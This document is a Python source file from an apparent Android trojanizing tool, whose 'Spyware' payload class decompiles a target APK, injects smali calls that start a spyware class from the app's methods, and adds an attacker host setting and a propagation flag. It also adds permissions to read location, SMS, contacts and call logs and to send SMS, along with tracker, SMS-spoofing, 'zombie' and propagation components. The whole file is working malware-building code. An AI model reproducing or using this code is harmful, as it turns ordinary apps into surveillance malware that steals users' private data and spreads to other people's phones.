#    Copyright (C) 2015 Alexandre Teyar

# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at

# http://www.apache.org/licenses/LICENSE-2.0

# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
#    limitations under the License.

import os
import shutil
import subprocess
import time
import zipfile

from metadata import metadata
from payloads.payload import Payload
from utils import info, register, util

class Spyware(Payload):
    def __init__(self, args):
        Payload.__init__(self, args)
        self.rhost = self.args.rhost
        self.propagate = self.args.propagate

    def run(self):
        self.update_manifest()
        payload_path = self.copy_to_apk(self.target)
        self.set_rhost_ppg(payload_path)

        if (os.path.isdir(self.target)):
            d_metadata = metadata.generate_d_metadata(self.target)
            self.inject_in_dir(d_metadata)

            # Displays result information
            util.get_dir_info(self, d_metadata)

        elif (os.path.isfile(self.target)):
            f_metadata = metadata.generate_f_metadata(self.target)
            self.inject(self.target, f_metadata)

            # Displays result information
            util.get_file_info(self, f_metadata)


    def inject(self, f_path, f_metadata):
        """
        Inject the spyware.
        """
        buffer = []
        data = []
        valid_regs = []
        process = False

        with open(f_path, 'r') as file:
            for line in file:
                # We ignore the abstract and static methods (we need to get
                # an application context (this))
                if ((line.find(".method ") == 0) and
                    (line.find("abstract ") < 0) and
                    (line.find('static') < 0) and
                    (self.keywords[0] == '-1' or
                        any(keyword in line for keyword in self.keywords))):
                    words = line.split()
                    # Retrieving the method information from the meta-data
                    data = metadata.get_data(words[-1], f_metadata)
                    valid_regs = register.get_valid_regs(data[3], data[2])
                    # The method must have at least one free register, less
                    # than sixteen register, must not
                    # contain any monitor directive and not be alredy edited
                    if ((len(valid_regs) > 1) and (len(data[2]) < 16) and not
                       (data[4]) and not (self.name in data[5])):
                        process = True

                    buffer.append(line)

                elif ((line.find("return", 0, 20) > 0) and (process)):
                    # We mark the method as processed
                    buffer.append("\t# {0} has been injected on {1}\n".format(
                        self.name, time.strftime("%Y-%m-%d %H:%M:%S",
                                                 time.gmtime())))
                    data[5].append(self.name)

                    # We initialize our spyware class with an application
                    # context
                    buffer.append("\tnew-instance {0}, \
                        Landroid/spyware/Spyware;\n".format(valid_regs[0]))
                    buffer.append("\tinvoke-virtual {{p0}}, \{0}->getApplicatio\
                        nContext()Landroid/content/Context;\n".format(data[0]))
                    buffer.append("\tmove-result-object {0}\n".format(
                        valid_regs[1]))
                    buffer.append("\tinvoke-direct {{{0}, {1}}}, \
                        Landroid/spyware/Spyware;-><init>(Landroid/content/Cont\
                        ext;)V\n".format(valid_regs[0], valid_regs[1]))

                    # We instantiate a spyware and hijack the app
                    buffer.append("\t.local {0}, \"launcher\":Landroid/spyware/\
                        Spyware;\n".format(valid_regs[0]))
                    buffer.append("\tinvoke-virtual {{{0}}}, Landroid/spyware/\
                        Spyware;->run()V\n".format(valid_regs[0]))
                    buffer.append(line)

                # Resetting the vars for the next method
                elif ((line.find(".end method") == 0) and (process)):
                    data = []
                    valid_regs = []
                    process = False

                    buffer.append(line)

                else:
                    buffer.append(line)

        # Overwritting the .smali file
        with open(f_path, 'w') as file:
            for line in buffer:
                file.write(line)

    # Move it to payload and give as an argument the permissions to add
    def update_manifest(self):
        """
        Disassemble an app using apktool to extract, edit and recompile
        the AndroidManifest.
        """
        cmd = "apktool d -f -s {0} -o {1}".format(self.app, os.path.join(
            "tmp", self.app_name + "-res"))
        subprocess.call([cmd], shell=True, stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL)

        self.add_permissions(os.path.join("tmp", self.app_name + "-res",
                                          "AndroidManifest.xml"))

        cmd = "apktool b -f {0} -o {1}".format(os.path.join(
            "tmp", self.app_name + "-res"), os.path.join(
            "tmp", self.app_name + "-res.apk"))
        subprocess.call([cmd], shell=True, stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL)

        if not (os.path.exists(
                os.path.join("tmp", self.app_name + "-res.apk"))):
            return False

        # We remove the generated folder "-res"
        shutil.rmtree(os.path.join("tmp", self.app_name + "-res"))

        # We extract and move the recoded AndroidManifest.xml from the
        # "-res.apk"
        zipfile.ZipFile(os.path.join(
            "tmp", self.app_name +
            "-res.apk")).extractall(os.path.join("tmp",
                                                 self.app_name + "-manif"))
        util.move_file(os.path.join(
            "tmp", self.app_name + "-manif", "AndroidManifest.xml"),
            os.path.join("tmp", "AndroidManifest.xml"))

        # We remove the generated "-res.apk" and "-manif" folder
        shutil.rmtree(os.path.join("tmp", self.app_name + "-manif"))
        os.remove(os.path.join("tmp", self.app_name + "-res.apk"))

        return True

    def set_rhost_ppg(self, d_path):
        """
        Add the rhost and ppg to the AndroidManifest.
        """
        files = os.listdir(d_path)

        for file in files:
            buffer = []
            f_path = os.path.abspath(os.path.join(d_path, file))

            with open(f_path, 'r') as file:
                for line in file:
                    if (line.find("<--ATTACKER-->") >= 0):
                        buffer.append(line.replace("<--ATTACKER-->",
                                                   self.rhost))
                    elif (line.find("<--PROPAGATE-->") >= 0):
                        buffer.append(line.replace("<--PROPAGATE-->",
                                                   self.propagate))
                    else:
                        buffer.append(line)

            # Overwritting the .smali file
            with open(f_path, 'w') as file:
                for line in buffer:
                    file.write(line)

    def add_permissions(self, f_path):
        """
        Add the minimum required permissions, services and broadcastReceivers
        to the AndroidManifest.
        """
        m_path = os.path.abspath(f_path)
        buffer = []

        with open(m_path, 'r') as file:
            for line in file:
                if (line.find("<manifest ") >= 0):
                    buffer.append(line)
                    buffer.append('\t<uses-permission \
                        android:name="android.permission.\
                        ACCESS_COARSE_LOCATION"/>\n')
                    buffer.append('\t<uses-permission \
                        android:name="android.permission.\
                        ACCESS_FINE_LOCATION"/>\n')
                    buffer.append('\t<uses-permission \
                        android:name="android.permission.\
                        ACCESS_NETWORK_STATE"/>\n')
                    buffer.append('\t<uses-permission \
                        android:name="android.permission.GET_ACCOUNTS"/>\n')
                    buffer.append('\t<uses-permission \
                        android:name="android.permission.INTERNET"/>\n')
                    buffer.append('\t<uses-permission \
                        android:name="android.permission.READ_CALL_LOG"/>\n')
                    buffer.append('\t<uses-permission \
                        android:name="android.permission.READ_CONTACTS"/>\n')
                    buffer.append('\t<uses-permission \
                        android:name="android.permission.\
                        READ_PHONE_STATE"/>\n')
                    buffer.append('\t<uses-permission \
                        android:name="android.permission.READ_SMS"/>\n')
                    buffer.append('\t<uses-permission \
                        android:name="android.permission.RECEIVE_SMS"/>\n')
                    buffer.append('\t<uses-permission \
                        android:name="android.permission.SEND_SMS"/>\n')

                elif (line.find("<application ") >= 0):
                    buffer.append(line)
                    buffer.append('\t<service \
                        android:name="android.spyware.PropagateS"/>\n')
                    buffer.append('\t<service \
                        android:name="android.spyware.TrackerS"/>\n\n')

                    buffer.append('\t<receiver \
                        android:name="android.spyware.SendSMSR">\n')
                    buffer.append('\t\t<intent-filter>\n')
                    buffer.append('\t\t\t<action \
                        android:name="android.provider.\
                        Telephony.SMS_RECEIVED"/>\n')
                    buffer.append('\t\t</intent-filter>\n')
                    buffer.append('\t</receiver>\n')
                    buffer.append('\t<receiver \
                        android:name="android.spyware.SendZombieR"/>\n')
                    buffer.append('\t<receiver \
                        android:name="android.spyware.SpoofSMSR"/>\n\n')
                else:
                    buffer.append(line)

        # Overwritting the .smali file
        with open(m_path, 'w') as file:
            for line in buffer:
                file.write(line)